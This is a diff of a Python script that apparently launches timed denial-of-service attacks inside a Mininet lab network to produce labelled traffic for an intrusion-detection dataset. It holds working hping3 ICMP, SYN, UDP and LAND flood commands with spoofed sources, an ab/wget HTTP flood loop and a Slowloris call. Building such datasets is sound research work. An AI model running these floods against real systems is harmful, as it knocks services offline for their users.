@@ -4,99 +4,109 @@ Usage
 -----
     sudo python3 run_attack.py
 
-Run OUTSIDE Mininet (from a host terminal or from Mininet CLI using xterm).
-Generates each attack type for ATTACK_DURATION seconds with a pause between.
-Writes run_attack_log.json with exact unix timestamps for automatic labeling.
+Run OUTSIDE Mininet on h3 (the attacker host) via xterm or directly.
+Writes run_attack_log.json with exact unix timestamps for label_dataset.py.
 
-IMPORTANT: Set COLLECTION_MODE = True in switch.py and monitor.py before running this.
-IMPORTANT: Disable DMZ rules in switch.py before running this (comment out
-           the call to _install_core_routing in switch_features_handler).
+IMPORTANT: NORMAL_COLLECTION_MODE = False, ATTACK_COLLECTION_MODE = True in monitor.py
 """
 
 import subprocess
 import time
 import json
 
-ATTACK_DURATION = 200   # seconds per attack type
-PAUSE           = 50    # seconds between attacks
-LOG_PATH        = 'run_attack_log.json'
+DEFAULT_DURATION = 200  # seconds per attack
+PAUSE            = 50   # seconds to wait between attacks for flow stats to stabilize
+LOG_PATH         = 'run_attack_log.json'
 
-# Target multiple hosts to generate rich and varied flow data
-# Targets:
-#   192.168.10.10  = http  (DMZ)
-#   192.168.20.10  = ftp   (LAN)
-#   192.168.20.11  = smtp  (LAN)
-#   192.168.20.12  = dns   (LAN)
-#   192.168.20.101 = h1    (LAN)
-
-ATTACKS = [
-    # ------------------------------------------------------------------
-    # Volume-based: ICMP flood
-    # ------------------------------------------------------------------
+# =========================
+# EXTERNAL (run on h_ext)
+# =========================
+EXTERNAL_ATTACKS = [
     {
         'name': 'ICMP_flood',
         'cmds': [
             'hping3 --icmp --flood --rand-source 192.168.10.10',
-            'hping3 --icmp --flood --rand-source 192.168.20.101',
-            'hping3 --icmp --flood --rand-source 192.168.20.10',
         ],
     },
-    # ------------------------------------------------------------------
-    # Protocol-based: SYN flood
-    # ------------------------------------------------------------------
     {
         'name': 'SYN_flood',
         'cmds': [
-            'hping3 -S --flood --rand-source -p 80  192.168.10.10',
-            'hping3 -S --flood --rand-source -p 21  192.168.20.10',
-            'hping3 -S --flood --rand-source -p 25  192.168.20.11',
+            'hping3 -S --flood --rand-source -p 80 192.168.10.10',
         ],
     },
-    # ------------------------------------------------------------------
-    # Volume-based: UDP flood
-    # ------------------------------------------------------------------
     {
         'name': 'UDP_flood',
         'cmds': [
-            'hping3 --udp --flood --rand-source -p 53  192.168.20.12',
-            'hping3 --udp --flood --rand-source -p 80  192.168.10.10',
-            'hping3 --udp --flood --rand-source -p 21  192.168.20.10',
+            'hping3 --udp --flood --rand-source -p 80 192.168.10.10',
         ],
     },
-    # ------------------------------------------------------------------
-    # Application-based: HTTP flood
-    # ------------------------------------------------------------------
     {
         'name': 'HTTP_flood',
         'cmds': [
-            'hping3 -S --faster --rand-source -p 80 192.168.10.10',
+            'ab -n 999999 -c 200 http://192.168.10.10/ || '
+            'while true; do wget -q -O /dev/null http://192.168.10.10; done',
         ],
     },
-    # ------------------------------------------------------------------
-    # Protocol-based: LAND attack (spoof src = dst)
-    # ------------------------------------------------------------------
     {
         'name': 'LAND_attack',
         'cmds': [
-            'hping3 -S --flood --spoof 192.168.10.10  192.168.10.10  -p 80',
-            'hping3 -S --flood --spoof 192.168.20.101 192.168.20.101 -p 22',
-        ],
-    },
-    # ------------------------------------------------------------------
-    # Application-based: Slowloris
-    # ------------------------------------------------------------------
-    {
-        'name': 'SLOWLORIS',
-        'cmds': [
-            'python3 slowloris.py',
+            'hping3 -S --flood --spoof 192.168.10.10 192.168.10.10 -p 80',
         ],
     },
 ]
 
+# =========================
+# INTERNAL (run on h3)
+# =========================
+INTERNAL_ATTACKS = [
+    {
+        'name': 'SLOWLORIS',
+        'cmds': ['python3 slowloris.py'],
+        'duration': 400,
+    },
+    {
+        'name': 'UDP_flood',
+        'cmds': [
+            'hping3 --udp --flood --spoof 192.168.20.101 -p 53 192.168.20.12',
+            'hping3 --udp --flood --spoof 192.168.20.102 -p 53 192.168.20.12',
+            'hping3 --udp --flood --spoof 192.168.20.103 -p 53 192.168.20.12',
+        ],
+    },
+]
+
+def determine_attack_suite():
+    try:
+        # hot IP from the system
+        result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
+        ips = result.stdout.strip().split()
+        
+        for ip in ips:
+            if ip.startswith('10.'):
+                print(f"[+] Detected external IP ({ip}). Loading EXTERNAL_ATTACKS.")
+                return EXTERNAL_ATTACKS
+            elif ip.startswith('192.168.20.'):
+                print(f"[+] Detected internal IP ({ip}). Loading INTERNAL_ATTACKS.")
+                return INTERNAL_ATTACKS
+    except Exception as e:
+        print(f"[-] Could not read IPs automatically: {e}")
+
+    # fallback to asking the user
+    while True:
+        choice = input("[?] Run (E)xternal or (I)nternal attacks? [e/i]: ").strip().lower()
+        if choice.startswith('e'):
+            return EXTERNAL_ATTACKS
+        elif choice.startswith('i'):
+            return INTERNAL_ATTACKS
+        print("Please enter 'e' or 'i'.")
+
+# Automatically determine the attack suite based on the node's IP
+ATTACKS = determine_attack_suite()
+
 log = []
 
 for attack in ATTACKS:
-    print(f'\n[+] Starting {attack["name"]}...')
+    duration = attack.get('duration', DEFAULT_DURATION)
+    print(f'\n[+] Starting {attack["name"]} (duration={duration}s)...')
     start = time.time()
 
     procs = []
@@ -104,27 +114,26 @@ for attack in ATTACKS:
         p = subprocess.Popen(
             cmd, shell=True,
             stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
         )
         procs.append(p)
 
-    time.sleep(ATTACK_DURATION)
+    time.sleep(duration)
 
     for p in procs:
         p.terminate()
         p.wait()
 
     end = time.time()
-
     log.append({
         'attack_type': attack['name'],
-        'start':       start,
-        'end':         end,
+        'start': start,
+        'end': end
     })
 
     print(f'    start : {start:.2f}')
     print(f'    end   : {end:.2f}')
-    print(f'[+] {attack["name"]} done. Pausing {PAUSE}s ...')
+    print(f'[+] {attack["name"]} done. Pausing {PAUSE}s...')
     time.sleep(PAUSE)
 
 # save log
